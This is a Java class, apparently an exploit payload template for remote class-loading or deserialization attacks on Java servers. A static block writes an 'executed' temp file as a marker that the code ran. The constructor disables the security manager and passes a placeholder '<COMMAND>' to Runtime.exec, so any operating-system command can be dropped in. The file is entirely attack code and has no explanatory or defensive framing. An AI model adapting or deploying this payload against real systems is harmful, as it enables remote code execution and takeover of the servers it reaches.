import java.io.File;
import java.io.IOException;

public class ExportObject {

	static {
		try {
			File.createTempFile("executed", ".tmp");
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	
	public ExportObject() {
		try {
			System.setSecurityManager(null);
			java.lang.Runtime.getRuntime().exec("<COMMAND>");
		} catch(Exception e) {
			e.printStackTrace();
		}
	}
}